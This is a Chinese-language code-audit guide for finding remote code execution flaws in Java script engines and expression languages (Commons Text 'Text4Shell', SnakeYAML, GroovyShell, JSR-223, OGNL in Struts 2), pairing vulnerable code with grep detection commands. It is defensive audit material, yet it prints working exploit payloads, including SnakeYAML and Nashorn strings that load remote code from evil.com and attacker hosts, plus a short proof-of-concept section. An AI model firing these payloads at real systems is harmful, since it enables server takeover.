# Java 脚本引擎 & 表达式语言 RCE 检测模块

> Java生态边角RCE风险：脚本引擎、表达式语言隐式执行、文本插值

---

## 1. Apache Commons Text (CVE-2022-42889 "Text4Shell")

**影响**: commons-text 1.5 - 1.9 | CVSS 9.8

```java
// ❌ Critical
StringSubstitutor substitutor = StringSubstitutor.createInterpolator();
String result = substitutor.replace(userInput);  // RCE!

// Payload:
// ${script:javascript:java.lang.Runtime.getRuntime().exec('calc')}
// ${dns:attacker.com}
```

```bash
grep -rn "StringSubstitutor" --include="*.java" -A 5 | grep -E "createInterpolator|replace"
grep -rn "StringLookupFactory" --include="*.java" -A 3
grep -A 2 "commons-text" pom.xml | grep -E "<version>1\.[5-9]"
```

---

## 2. SnakeYAML Constructor RCE (CVE-2022-1471)

**影响**: SnakeYAML < 2.0 | CVSS 9.8

```java
// ❌ Critical: 默认Constructor
Yaml yaml = new Yaml();
Object obj = yaml.load(userInput);  // RCE!

// ❌ Critical: 动态类型
Class<?> clazz = Class.forName(request.getParameter("type"));
yaml.loadAs(input, clazz);

// Payload:
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://evil.com/payload.jar"]
  ]]
]
```

```bash
grep -rn "new Yaml()" --include="*.java" -A 3
grep -rn "\.load\s*(" --include="*.java" -B 5 | grep -E "Yaml|yaml"
grep -rn "\.loadAs\s*(" --include="*.java" -A 2 | grep "Class\.forName\|request\."
grep -A 2 "snakeyaml" pom.xml | grep -E "<version>(1\.|[^2])"
```

---

## 3. GroovyShell RCE

```java
// ❌ Critical
GroovyShell shell = new GroovyShell();
shell.evaluate(userInput);  // RCE!

// ❌ Critical: 路径可控
GroovyScriptEngine engine = new GroovyScriptEngine(".");
engine.run(request.getParameter("script"), new Binding());

// Payload: "Runtime.getRuntime().exec('calc')" / "'whoami'.execute().text"
```

```bash
grep -rn "new GroovyShell\|GroovyScriptEngine" --include="*.java" -A 5
grep -rn "\.evaluate\s*(" --include="*.java" -B 10 | grep -E "GroovyShell|shell"
grep -A 2 "groovy-all\|groovy-" pom.xml
```

---

## 4. javax.script (JSR-223) 通用脚本引擎

```java
// ❌ Critical: eval用户输入
ScriptEngine engine = new ScriptEngineManager().getEngineByName("javascript");
engine.eval(userInput);  // RCE!

// ❌ Critical: 用户控制引擎类型
String engineName = request.getParameter("engine");
ScriptEngine engine = manager.getEngineByName(engineName);

// Payload (Nashorn):
// "Java.type('java.lang.ProcessBuilder')(['cmd','/c','calc']).start()"
// "load('http://evil.com/payload.js')"
```

```bash
grep -rn "ScriptEngineManager" --include="*.java" -A 5
grep -rn "\.eval\s*(" --include="*.java" -B 10 | grep -E "ScriptEngine|engine"
grep -rn "getEngineByName" --include="*.java" -A 3
grep -rn "nashorn\|javascript.*engine" --include="*.java" -i
grep -A 2 "graalvm.*js\|org.graalvm.js" pom.xml
```

---

## 5. OGNL (Struts 2) 表达式注入

**CVE**: CVE-2017-5638, CVE-2018-11776, CVE-2019-0230

```java
// ❌ Critical: OGNL.getValue
String expression = request.getParameter("expr");
Object result = Ognl.getValue(expression, context, new Object());  // RCE!

// ❌ Critical: Struts 2 JSP tag
<s:property value="%{userInput}" />  // OGNL执行
```

```bash
grep -rn "Ognl\.getValue\|Ognl\.setValue" --include="*.java" -A 3
grep -rn "OgnlContext" --include="*.java" -A 5
grep -A 2 "struts2-core" pom.xml | grep "<version>"
grep -rn "%{.*}" --include="struts.xml"
grep -rn "<s:property.*value=" --include="*.jsp"
grep -rn "struts.devMode.*true" --include="*.xml" --include="*.properties"
```

---

## 最小 PoC

```java
// Commons Text CVE-2022-42889
new StringSubstitutor().replace("${script:javascript:java.lang.Runtime.getRuntime().exec('id')}");

// SnakeYAML CVE-2022-1471
new Yaml().load("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://attacker/\"]]]]");
```
